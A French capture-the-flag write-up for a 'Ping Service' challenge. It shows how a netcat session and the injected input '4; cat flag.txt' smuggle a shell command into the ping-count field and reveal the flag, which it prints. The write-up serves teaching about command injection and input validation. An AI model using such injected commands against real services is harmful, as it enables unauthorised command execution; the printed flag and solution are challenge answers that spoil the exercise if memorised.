# 🛠️ Write-up : Ping Service 🛠️

Bienvenue dans le défi **Ping Service** ! 🌐 Voici le scénario :

> "Je me suis créé un petit service en ligne pour pinguer ma machine et voir si tout fonctionne, c'est pas définitif, j'espère que personne ne pourra contourner le service..."

🕵️‍♂️ **Objectif** : Trouver le flag en accédant au service situé sur **10.29.135.5:2222**.

## 📋 Étapes pour résoudre le défi

### 1️⃣ Connexion au service
Nous utilisons la commande **netcat** pour interagir avec le service :
```bash
$ nc 10.29.135.5 2222
```
🎉 Une fois connecté, le service nous demande d'entrer un **nombre**. Par exemple :
```bash
[PING SERVICE] Veuillez entrer le nombre de paquets :
> 4
```
Cela envoie 4 pings à `127.0.0.1` et retourne les résultats.

### 2️⃣ Observation du comportement
🔍 J'ai essayé plusieurs commandes non valides pour voir comment le service réagit :
- `ls` ➡️ **"Veuillez entrer un nombre."**
- `pwd` ➡️ **"Veuillez entrer un nombre."**
- Toute commande non entière est rejetée.

### 3️⃣ Injection d'une commande 🛡️
Le service accepte des **entiers**, mais j'ai exploité cette validation en injectant une commande malveillante. 😈

💡 **Payload magique :**
```
> 4; cat flag.txt
```
✅ Ce payload envoie 4 pings **puis exécute `cat flag.txt`** pour lire le contenu du fichier contenant le flag.

### 4️⃣ Le flag ✨
Le service retourne le flag 🎯 :
```
Bravo, voici le flag de ce challenge:PasSécuCa!
```

## 📦 Commande complète :
```bash
$ nc 10.29.135.5 2222
[PING SERVICE] Veuillez entrer le nombre de paquets :
> 4; cat flag.txt
```
🚀 **Et voilà, mission accomplie !**

## 🥳 Conclusion
Ce challenge montre l'importance de valider correctement les entrées utilisateur pour éviter les **injections de commandes**. Bravo à vous pour avoir réussi ! 💪

🎉 **Flag** : `PasSécuCa!`
